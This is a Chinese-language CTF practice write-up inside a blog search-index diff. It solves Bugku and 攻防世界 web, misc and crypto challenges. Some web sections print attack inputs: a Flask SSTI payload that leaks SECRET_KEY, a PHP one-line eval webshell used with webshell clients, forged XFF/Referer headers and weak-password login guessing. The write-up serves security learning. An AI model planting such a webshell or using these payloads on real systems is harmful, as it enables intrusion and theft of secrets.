@@ -1,6 +1,196 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>CTF 成长之路</title>
+    <url>/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/</url>
+    <content><![CDATA[<h1 id="一些题库练习"><a href="#一些题库练习" class="headerlink" title="一些题库练习"></a>一些题库练习</h1><h2 id="Bugku-CTF"><a href="#Bugku-CTF" class="headerlink" title="Bugku CTF"></a>Bugku CTF</h2><p>签到题就不必了哈，公众号关注回复即可拿到 flag ，了解一个基础格式 <code>flag&#123;key&#125;</code></p>
+<h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h4><blockquote>
+<p>描述：计算正确即可得到flag</p>
+</blockquote>
+<p>启动场景发现就是一个很简单的html页面，对图片里的算式进行计算： </p>
+<p><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580428948703.jpg" alt="计算器"><br>输入答案发现输入框只能输入一位数字，验证提示输入失败！查看网页代码发现对输入框长度进行了限制，只需要将其改为我们所需要的长度即可成功输入答案通过验证</p>
+<h4 id="Simple-SSTI-1"><a href="#Simple-SSTI-1" class="headerlink" title="Simple_SSTI_1"></a>Simple_SSTI_1</h4><blockquote>
+<p>描述: Simple_SSTI_1</p>
+</blockquote>
+<p>根据描述我们可知应该是 <strong>服务器模版注入</strong> ，启动场景网页提示，“你需要传入一个名为flag的参数”：</p>
+<p><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580432363022.jpg" alt="Simple_SSTI_1"><br>查看网页源代码发现最下端有提示：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580435206034.jpg"></p>
+<ul>
+<li>flask：是由python实现的一种微web框架   </li>
+<li>SECRET_KEY：flask中的一种配置属性，flask涉及安全的东西需要用这个SECRET_KEY密钥进行加密</li>
+</ul>
+<p>到这里基本上可以确定题目的 flag 就藏在 SECRET_KEY 中，首先测试一下是否能回显，显示成功即表示存在该漏洞：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580436166187.jpg"><br>接下来通过 <code>?flag=&#123;&#123;config&#125;&#125;</code> 看一下哪些全局变量可用，没想到 flag 直接出来了，比较简单<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580436726542.jpg"><br>或者也可以通过在 URL 补充语句 <code>?flag=&#123;&#123;config.SECRET_KEY&#125;&#125;</code> 得到 flag </p>
+<h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="这是一张单纯的图片"><a href="#这是一张单纯的图片" class="headerlink" title="这是一张单纯的图片"></a>这是一张单纯的图片</h4><blockquote>
+<p>描述: key{}</p>
+</blockquote>
+<p>根据题目描述我们猜测此题的 flag 格式为 <code>key&#123;&#125;</code> ，题目下载得到一张如下图片：</p>
+<p><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/file.jpg" alt="file"><br>单看图片没发现什么问题，用 HexFiend 或 WinHex等十六进制编辑器打开查看，企图找到 ctf、CTF、flag、key 等关键字，结果发现一串很有意思的编码：</p>
+<p><img src="/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF//CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/pichex.png" alt="pichex"><br>通过 <strong>Unicode</strong> 解密可得到 flag </p>
+<h4 id="社工-进阶收集"><a href="#社工-进阶收集" class="headerlink" title="社工-进阶收集"></a>社工-进阶收集</h4><blockquote>
+<p>提示: flag{小美小区名字拼音}</p>
+</blockquote>
+<blockquote>
+<p>描述: 小明当年为了追求小美想尽办法获得小美的地址。直到有一天小美发了一条说说，小明觉得希望来了。 (实战改编 难度降低)</p>
+</blockquote>
+<p>下载题目发现是一张简单说说对话截图，根据图片我们可以得到一些信息：</p>
+<p><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580448564615.jpg"></p>
+<ul>
+<li>图片内容：西安大雁塔（可通过百度识图找到）</li>
+<li>七站地铁到达大雁塔</li>
+<li>途中地铁需要转一站</li>
+<li>始发地地铁上车，离家800多米</li>
+<li>第二站地铁上车，离家1公里多</li>
+</ul>
+<p>纯纯就是翻看西安地图。。。。 研究地铁路线图不难发现小美应该是在韦曲南地铁站上车，她家就在韦曲南和航天城两个站之间<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580450931943.jpg"><br>打开百度地图看看韦曲南和航天站距离，从韦曲南开始查看800米左右附件的小区，挨个试试：</p>
+<p><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/xiaomei.png" alt="xiaomei"><br>最后发现是兰乔国际城， <code>flag&#123;lanqiaoguojicheng&#125;</code></p>
+<h3 id="Cypto"><a href="#Cypto" class="headerlink" title="Cypto"></a>Cypto</h3><h4 id><a href="#" class="headerlink" title="/.-"></a>/.-</h4><blockquote>
+<p>描述:<br>..-./.-../.-/–./—-.–/-../…–/..-./-.-./-…/..-./.—-/–…/..-./—-./…–/—-./—-./…../—–/….-/—–.-</p>
+</blockquote>
+<p>显而易见这就是 <strong>摩斯密码</strong>，找个网址解密即可得到 flag</p>
+<h4 id="聪明的小羊"><a href="#聪明的小羊" class="headerlink" title="聪明的小羊"></a>聪明的小羊</h4><blockquote>
+<p>描述: 一只小羊翻过了2个栅栏 fa{fe13f590lg6d46d0d0}</p>
+</blockquote>
+<p>搜索发现这是 <strong>栅栏密码</strong>，找到工具 <a href="https://ctf.bugku.com/tool/railfence">栅栏加解/密</a> ，输入栏数 <code>2</code> 和密文 <code>fa&#123;fe13f590lg6d46d0d0&#125;</code> 解密即破：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580462553718.jpg"></p>
+<h4 id="lt-gt"><a href="#lt-gt" class="headerlink" title="[+-&lt;&gt;]"></a>[+-&lt;&gt;]</h4><blockquote>
+<p>描述: +++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;– -&lt;]&gt;- -.+++ +++.&lt; ++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++++ +++[- &gt;—- —-&lt; ]&gt;— —– —.&lt; +++++ ++[-&gt; +++++ ++&lt;]&gt; +++.&lt; +++++ +[-&gt;- —– &lt;]&gt;– —– -.–. —-. –.++ +++++ +.&lt;++ ++++[ -&gt;+++ +++&lt;] &gt;++++ +.++. &lt;++++ ++[-&gt; —– -&lt;]&gt;- —– —-. -.&lt;++ +++++ [-&gt;++ +++++ &lt;]&gt;+. —-. ++++. &lt;++++ +++[- &gt;—- —&lt;] &gt;—- .+.&lt;+ +++++ ++[-&gt; +++++ +++&lt;] &gt;++++ +++++ ++.&lt;</p>
+</blockquote>
+<p>这什么东西？？？？<br>通过搜索发现它是 <strong>Brainfuck</strong> 语言，找到网站尝试解密 <a href="https://www.splitbrain.org/services/ook">Brainfuck/Ook! Obfuscation/Encoding</a><br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580466034211.jpg"><br>成功得到 flag 啦～</p>
+<h4 id="ok"><a href="#ok" class="headerlink" title="ok"></a>ok</h4><blockquote>
+<p>描述: Ook.</p>
+</blockquote>
+<p>omg 文件下载打开之后发现截图都截不完，全是 <code>Ook</code> 这个字符，不过观察发现标点符号是不一样的，嗯？这里面一定有问题！ 搜索发现竟然还有一种编码就叫做 <strong>Ook</strong> 编码，利用 <a href="https://tool.bugku.com/brainfuck/">编码工具</a> 解码得到 flag </p>
+<h4 id="抄错的字符"><a href="#抄错的字符" class="headerlink" title="抄错的字符"></a>抄错的字符</h4><blockquote>
+<p>描述: 老师让小明抄写一段话，结果粗心的小明把部分数字抄成了字母，还因为强迫症把所有字母都换成大写。你能帮小明恢复并解开答案吗：QWIHBLGZZXJSXZNVBZW</p>
+</blockquote>
+<p>题目可知给出的字符串中的每个字符原来可能是大小写字母或数字，那我就直接暴力枚举了，优先级：数字 &gt; 小写字母 &gt; 大写字母，然后将枚举出来的字符进行解密（盲猜 base64 ，通过评论区确认）。随便找到一个 <a href="https://base64.us/">base64解码网站</a> ，将可能抄错的英文字母换成数字，然后切换几个大小写字母（随机），不是乱码但看起来好像也不太对劲？：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/base64string.png" alt="base64string"><br>反复尝试终于找到一个貌似正确的内容（题目作者: Aman）： <code>QW1hbl92ZXJ5X2Nvb2w</code> ，解码得到 <code>Aman_very_cool</code> ，加上 flag 框架即可成功提交答案</p>
+<h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><p>知识盲区。。。</p>
+<h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><p>知识盲区➕1</p>
+<h2 id="攻防世界"><a href="#攻防世界" class="headerlink" title="攻防世界"></a>攻防世界</h2><p>这个怎么签到题都不给一个啊 害😮‍💨</p>
+<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h4><blockquote>
+<p>描述: X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了</p>
+</blockquote>
+<p>打开网页发现无法点击右键 <strong>查看网页源代码</strong> ，于是通过 <code>F12</code> 查看网页源代码找到 flag</p>
+<h4 id="get-post"><a href="#get-post" class="headerlink" title="get_post"></a>get_post</h4><blockquote>
+<p>描述: X老师告诉小宁同学 <strong>HTTP通常使用两种请求方法</strong> ，你知道是哪两种吗？</p>
+</blockquote>
+<p>根据网页描述通过 <code>get</code> 方法传入参数 <code>a=1</code>， 然后再通过 <code>hackbar</code> 插件或 <code>burpsuite</code> 软件传入参数 <code>b=2</code>，然后执行得到 flag<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580489573238.jpg" alt="16580489573238"></p>
+<h4 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h4><blockquote>
+<p>描述: X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。</p>
+</blockquote>
+<p><strong>Robots协议</strong> 就是爬虫协议，直接访问 <code>robots.txt</code>文件：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580488399367.jpg"><br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580488469803.jpg"><br>发现 flag 所在文件 <code>flag_1s_h3re.php</code>，访问此网页即可得到</p>
+<h4 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h4><blockquote>
+<p>描述: X老师忘记删除备份文件，他派小宁同学去把备份文件找出来，一起来帮小宁同学吧！</p>
+</blockquote>
+<p>进入答题网址后，发现是需要找 index.php 的备份文件，搜索发现 <strong>备份文件后缀名</strong> 为 .bak ，访问下载 index.pgp.bak 文件打开发现 flag</p>
+<h4 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h4><blockquote>
+<p>描述: X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想：‘这是夹心饼干的意思吗？’</p>
+</blockquote>
+<p>进入答题网址后，提示我们查看 cookie ，<code>F12 -&gt; Network -&gt;cookie</code>：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580497234917.jpg"><br>根据提示访问 cookie.php ，页面又提示我们查看 http 响应头，发现 flag ：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580497852930.jpg"></p>
+<h4 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h4><blockquote>
+<p>描述: X老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？</p>
+</blockquote>
+<p>又是一个前端限制题目，直接 F12 定位到 flag 处的代码，发现设置了 button 不可点，删除 disabled 回车就可以点击按钮了，然后得到 flag：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580499738618.jpg"></p>
+<h4 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h4><blockquote>
+<p>描述: 小宁写了一个登陆验证页面，随手就设了一个密码。</p>
+</blockquote>
+<p>根据题目描述首先想到爆破（还是弱口令），随手一试 <code>admin:123456</code> 就出来了。。。<br>正经步骤：burp 弱口令字典爆破</p>
+<h4 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h4><blockquote>
+<p>描述: 小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。</p>
+</blockquote>
+<p>看题目就是一个简单 php 代码审计的意思，通过 <code>GET</code> 方法得到 <code>a</code> 和 <code>b</code> 的值：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16580502749061.jpg"><br>根据代码：<code>b</code>不能是整数或纯数字字符串，且值大于1234，那么我们可以构造个 <code>12345a</code>，于是 payload 构造为 <code>?a==0&amp;b=12345a</code> 回车得到 flag</p>
+<h4 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h4><blockquote>
+<p>描述: X老师告诉小宁其实xff和referer是可以伪造的。</p>
+</blockquote>
+<p>根据描述和题目很容易猜到此题就是要构造 <strong>xff</strong> 和 <strong>referer</strong> ，打开第一步就是叫我们伪造 ip 地址，也就是伪造 xff 来，burpsuite 抓包后 Send to Repeater，直接在请求里面添加 <code>X-Forwarded-For: 123.123.123.123</code> ：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16582004268805.jpg"></p>
+<p>这时在 Response 里看到下一步提示 必须来源于 <a href="https://www.google.com/">https://www.google.com</a> ，说明叫我们修改 referer ，和上一步一样的办法，在请求里面添加 <code>Referer: https://www.google.com</code> ，点击发送得到 flag :<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16582004458456.jpg"></p>
+<h4 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h4><blockquote>
+<p>描述: 小宁百度了php一句话,觉着很有意思,并且把它放在index.php里。</p>
+</blockquote>
+<p>根据题意可知是 PHP <strong>一句话木马</strong> ，启动场景可以看到这句话具体内容为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#x27;shell&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里我们需要用一种 <strong>webshell</strong> 的工具，比如“菜刀”或者是“蚁剑”之类的，具体配置：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16582008518924.jpg"><br>连接成功后拿到权限很容易找到 <code>flag.txt</code> 文件：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16582009188308.jpg"></p>
+<h3 id="MISC-1"><a href="#MISC-1" class="headerlink" title="MISC"></a>MISC</h3><h4 id="this-is-flag"><a href="#this-is-flag" class="headerlink" title="this_is_flag"></a>this_is_flag</h4><blockquote>
+<p>描述:<br>Most flags are in the form flag{xxx}, for example:flag{th1s_!s_a_d4m0_4la9}</p>
+</blockquote>
+<p>啊！！签到题这不就来了吗？！ 竟然难度 2🌟  。。。</p>
+<h4 id="pdf"><a href="#pdf" class="headerlink" title="pdf"></a>pdf</h4><blockquote>
+<p>描述: 菜猫给了菜狗一张图，说图下面什么都没有</p>
+</blockquote>
+<p>打开图片后发现是 PDF 文件，预览显示和图片无差，尝试转成 word 文档打开，移开图片发现 flag：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16582287976918.jpg"></p>
+<h4 id="如来十三掌"><a href="#如来十三掌" class="headerlink" title="如来十三掌"></a>如来十三掌</h4><blockquote>
+<p>描述: 菜狗为了打败菜猫，学了一套如来十三掌。</p>
+</blockquote>
+<p>附件打开里面是一段看不懂的文字，但是也能看出这应该是一段佛文，立马想到【与佛论禅】（注意格式一定要加上：<code>佛曰：</code>），解密得到<code>MzkuM3gvMUAwnzuvn3cgozMlMTuvqzAenJchMUAeqzWenzEmLJW9</code> ，但输入发现不是正确 flag ，继续分析题目，联想到 <strong>rot13</strong> ，解码得到<code>ZmxhZ3tiZHNjamhia3ptbmZyZGhidmNraWpuZHNrdmJramRzYWJ9</code> ，输入依然错误，这时机智的来了一个 base64解密 ，顺利拿下 <code>flag&#123;bdscjhbkzmnfrdhbvckijndskvbkjdsab&#125;</code></p>
+<h4 id="转轮机加密"><a href="#转轮机加密" class="headerlink" title="转轮机加密"></a>转轮机加密</h4><blockquote>
+<p>描述:<br>你俩继续往前走，来到了前面的下一个关卡，这个铺面墙上写了好多奇奇怪怪的 英文字母，排列的的整整齐齐，店面前面还有一个大大的类似于土耳其旋转烤肉的架子，上面一圈圈的 也刻着很多英文字母，你是一个小历史迷，对于二战时候的历史刚好特别熟悉，一拍大腿：“嗨呀！我知道 是什么东西了！”。提示：托马斯·杰斐逊。flag，是字符串，小写。</p>
+</blockquote>
+<p>题目得到一个重要信息：托马斯·杰斐逊，发现这应该是 <strong>杰斐逊转轮密码</strong> ，没有解密器，就只能自己手动计算了：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1: &lt; ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt;</span><br><span class="line">2: &lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt;</span><br><span class="line">3: &lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt;</span><br><span class="line">4: &lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt;</span><br><span class="line">5: &lt; IHFRLABEUOTSGJVDKCPMNZQWXY &lt;</span><br><span class="line">6: &lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt;</span><br><span class="line">7: &lt; GWTHSPYBXIZULVKMRAFDCEONJQ &lt;</span><br><span class="line">8: &lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt;</span><br><span class="line">9: &lt; XPLTDSRFHENYVUBMCQWAOIKZGJ &lt;</span><br><span class="line">10: &lt; UDNAJFBOWTGVRSCZQKELMXYIHP &lt;</span><br><span class="line">11： &lt; MNBVCXZQWERTPOIUYALSKDJFHG &lt;</span><br><span class="line">12： &lt; LVNCMXZPQOWEIURYTASBKJDFHG &lt;</span><br><span class="line">13： &lt; JZQAWSXCDERFVBGTYHNUMKILOP &lt;</span><br><span class="line"></span><br><span class="line">密钥为：2,3,7,5,13,12,9,1,8,10,4,11,6</span><br><span class="line">密文为：NFQKSEVOQOFNP</span><br></pre></td></tr></table></figure>
+
+<p>根据密钥第一个数是 2 ，密文第一个是 N ，选择加密表 <code>2：&lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt;</code> ，把 N 后面的提前， N 前面的放后面 <code>NACZDTRXMJQOYHGVSFUWIKPBEL</code> ， 其他的类似：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16582314749300.jpg"><br>发现倒数第九列的字母可以拼出意思， <code>fireinthehole</code> （这个就是flag了，不用加其他的东西）</p>
+<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h4><blockquote>
+<p>描述:<br>元宵节灯谜是一种古老的传统民间观灯猜谜的习俗。 因为谜语能启迪智慧又饶有兴趣，灯谜增添节日气氛，是一项很有趣的活动。 你也很喜欢这个游戏，这不，今年元宵节，心里有个黑客梦的你，约上你青梅竹马的好伙伴小鱼， 来到了cyberpeace的攻防世界猜谜大会，也想着一展身手。<br>你们一起来到了小孩子叽叽喳喳吵吵闹闹的地方，你俩抬头一看，上面的大红灯笼上写着一些奇奇怪怪的 字符串，小鱼正纳闷呢，你神秘一笑，我知道这是什么了。</p>
+</blockquote>
+<p>下载附件发现就是一段 base64 编码，找个网站解码即可得到 flag</p>
+<p><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/base64.png" alt="base64"></p>
+<h4 id="Caesar"><a href="#Caesar" class="headerlink" title="Caesar"></a>Caesar</h4><blockquote>
+<p>描述:<br>你成功的解出了来了灯谜，小鱼一脸的意想不到“没想到你懂得这么多啊！” 你心里面有点小得意，“那可不是，论学习我没你成绩好轮别的我知道的可不比你少，走我们去看看下一个” 你们继续走，看到前面也是热热闹闹的，同样的大红灯笼高高挂起，旁边呢好多人叽叽喳喳说个不停。你一看 大灯笼，上面还是一对字符，你正冥思苦想呢，小鱼神秘一笑，对你说道，我知道这个的答案是什么了</p>
+</blockquote>
+<p>根据题目提示 Caesar 知道是 <strong>凯撒密码</strong>， 搜索找到在线解密网站。根据凯撒原理我们合理猜测 flag 格式为 <code>cyberpeace&#123;&#125;</code> ，计算得到 <code>o</code> 与 <code>c</code> 的差为12（或者挨个尝试1-25），发现位移 12 得到正确 flag：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16581992278104.jpg"></p>
+<h4 id="Morse"><a href="#Morse" class="headerlink" title="Morse"></a>Morse</h4><blockquote>
+<p>描述:<br>小鱼得意的瞟了你一眼，神神气气的拿走了答对谜语的奖励，你心里暗暗较劲 想着下一个谜题一定要比小鱼更快的解出来。不知不觉你们走到了下一个谜题的地方，这个地方有些奇怪。 上面没什么提示信息，只是刻着一些0和1，感觉有着一些奇怪的规律，你觉得有些熟悉，但是就是想不起来 这些01代表着什么意思。一旁的小鱼看你眉头紧锁的样子，扑哧一笑，对你讲“不好意思我又猜到答案了。”(flag格式为cyberpeace{xxxxxxxxxx},均为小写)</p>
+</blockquote>
+<p>打开附件发现写着一串二进制字符：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">11 111 010 000 0 1010 111 100 0 00 000 000 111 00 10 1 0 010 0 000 1 00 10 110</span><br></pre></td></tr></table></figure>
+
+<p>根据题目我们知道这是 <strong>摩斯密码</strong> ，但和常规 <code>.-</code> 形式不太一样，找到一个解密网站，根据 <code>. = 0 &amp;&amp; - = 1</code> 将上串二进制字符改为摩斯密码的形式解密得到 flag 内容，再添加个格式框即可</p>
+<h4 id="Railfence"><a href="#Railfence" class="headerlink" title="Railfence"></a>Railfence</h4><blockquote>
+<p>描述:<br>被小鱼一连将了两军，你心里更加不服气了。两个人一起继续往前走， 一路上杂耍卖艺的很多，但是你俩毫无兴趣，直直的就冲着下一个谜题的地方去了。 到了一看，这个谜面看起来就已经有点像答案了样子了，旁边还画着一张画，是一副农家小院的 图画，上面画着一个农妇在栅栏里面喂5只小鸡，你嘿嘿一笑对着小鱼说这次可是我先找到答案了。</p>
+</blockquote>
+<p>题目的翻译是“铁栅栏”，根据提示很容易便能想到分 5 栏的 <strong>栅栏密码</strong>，找到网站设置栏目数为 5 解密即可得到 flag</p>
+<h4 id="不仅仅是Morse"><a href="#不仅仅是Morse" class="headerlink" title="不仅仅是Morse"></a>不仅仅是Morse</h4><blockquote>
+<p>描述:<br>“这个题目和我们刚刚做的那个好像啊但是为什么按照刚刚的方法做出来答案却不对呢” ，你奇怪的问了问小鱼，“可能是因为还有一些奇怪的加密方式在里面吧，我们在仔细观察观察”。两个人 安安静静的坐下来开始思考，很耐心的把自己可以想到的加密方式一种种的过了一遍，十多分钟后两个人 异口同声的说“我想到了！”。一种食物,格式为cyberpeace{小写的你解出的答案}</p>
+</blockquote>
+<p>首先一串 <code>.-</code> 字符直接 <strong>摩斯密码</strong> 解密：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/Morseandpeigen.png" alt="Morseandpeigen"></p>
+<p>得到提示 <code>MAY_BE_HAVE_ANOTHER_DECODE</code> ，还有一串 <code>A</code> <code>B</code> 组成的字符，发挥脑子和搜索🔍，发现符合 <strong>培根密码</strong> 形式（也满足描述所说一种食物），解密即可得到flag</p>
+<h4 id="混合编码"><a href="#混合编码" class="headerlink" title="混合编码"></a>混合编码</h4><blockquote>
+<p>描述:<br>经过了前面那么多题目的历练，耐心细致在解题当中是 必不可少的品质，刚巧你们都有，你和小鱼越来越入迷。那么走向了下一个题目，这个题目好长 好长，你知道你们只要细心细致，答案总会被你们做出来的，你们开始慢慢的尝试，慢慢的猜想 ，功夫不负有心人，在你们耐心的一步步的解答下，答案跃然纸上，你俩默契一笑，相视击掌 走向了下面的挑战。格式为cyberpeace{小写的你解出的答案}</p>
+</blockquote>
+<p>打开附件发现两个等号和数字大小写组合字符，典型的base64编码型，直接转换得到一堆 &amp;# ：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16582027281003.jpg"></p>
+<p>猜测 <strong>Unicode编码</strong> 或 Hex ，又转出一串三位数的像 <strong>ASCII编码</strong> 的东西：<br><img src="/2022/08/12/CTF-%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/16582028335080.jpg"><br>对照 ASCII 码字符表可得到 flag （也可以写个脚本切割识别）</p>
+<h4 id="幂数加密"><a href="#幂数加密" class="headerlink" title="幂数加密"></a>幂数加密</h4><blockquote>
+<p>描述:<br>你和小鱼终于走到了最后的一个谜题所在的地方，上面写着一段话“亲爱的朋友， 很开心你对网络安全有这么大的兴趣，希望你一直坚持下去，不要放弃 ，学到一些知识， 走进广阔的安全大世界”，你和小鱼接过谜题，开始了耐心细致的解答。flag为cyberpeace{你解答出的八位大写字母}</p>
+</blockquote>
+<p>由题意可知此题为 <strong>幂数加密</strong>，附件里的内容为 <code>8842101220480224404014224202480122</code>，<br>而正常的二进制幂数加密只有 <code>0</code>、<code>1</code>、<code>2</code>、<code>3</code>、<code>4</code>、<code>5</code>，是不会出现 8 的，通过百度了解到这其实是 <strong>云影密码</strong> ，以 0 为分隔符，我们将每个字母的密文相加得推出英文字符：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">8+8+4+2+1=23 --&gt; W</span><br><span class="line">1+2+2=5 --&gt; E</span><br></pre></td></tr></table></figure>
+
+<p>依次计算得到 <code>WELLDONE</code> ，就是所需要的</p>
+<h3 id="Mobile"><a href="#Mobile" class="headerlink" title="Mobile"></a>Mobile</h3><p>还有手机专场啊🤔</p>
+<h3 id="Reverse-1"><a href="#Reverse-1" class="headerlink" title="Reverse"></a>Reverse</h3><p>下次一定。</p>
+<h3 id="PWN-1"><a href="#PWN-1" class="headerlink" title="PWN"></a>PWN</h3><p>好得很哇^_^</p>
+<hr>
+<h1 id="一些知识补充"><a href="#一些知识补充" class="headerlink" title="一些知识补充"></a>一些知识补充</h1><h2 id="服务器模版注入-SSTI"><a href="#服务器模版注入-SSTI" class="headerlink" title="服务器模版注入 SSTI"></a>服务器模版注入 SSTI</h2><h2 id="Unicode-编码"><a href="#Unicode-编码" class="headerlink" title="Unicode 编码"></a>Unicode 编码</h2><h2 id="摩斯密码-Morse"><a href="#摩斯密码-Morse" class="headerlink" title="摩斯密码 Morse"></a>摩斯密码 Morse</h2><h2 id="Brainfuck-Ook-语言"><a href="#Brainfuck-Ook-语言" class="headerlink" title="Brainfuck/Ook! 语言"></a>Brainfuck/Ook! 语言</h2><h2 id="查看网页源代码"><a href="#查看网页源代码" class="headerlink" title="查看网页源代码"></a>查看网页源代码</h2><p>三种方式：</p>
+<ul>
+<li>右键，选择查看网页源代码</li>
+<li>F12，选择elements</li>
+<li>网页地址栏前面加上 <code>view-source:</code></li>
+</ul>
+<h2 id="HTTP两种请求方法"><a href="#HTTP两种请求方法" class="headerlink" title="HTTP两种请求方法"></a>HTTP两种请求方法</h2><ul>
+<li>GET: 在 URL 后添加参数 <code>?/变量名=值</code></li>
+<li>POST: 打开 HackBar ，选择 post data，在下面文本框内输入参数 <code>变量名=值</code></li>
+</ul>
+<h2 id="Robots协议"><a href="#Robots协议" class="headerlink" title="Robots协议"></a>Robots协议</h2><p>Robots 协议也称爬虫协议、爬虫规则等，是指网站可建立一个 <code>robots.txt</code> 文件来告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取，而搜索引擎则通过读取 <code>robots.txt</code> 文件来识别这个页面是否允许被抓取。</p>
+<h2 id="xff-and-referer"><a href="#xff-and-referer" class="headerlink" title="xff and referer"></a>xff and referer</h2><h2 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h2><h2 id="webshell-1"><a href="#webshell-1" class="headerlink" title="webshell"></a>webshell</h2><h2 id="备份文件后缀名"><a href="#备份文件后缀名" class="headerlink" title="备份文件后缀名"></a>备份文件后缀名</h2><p>常见的备份文件后缀名有：“.git” 、“.svn”、“ .swp”“.~”、“.bak”、“.bash_history”、“.bkf” </p>
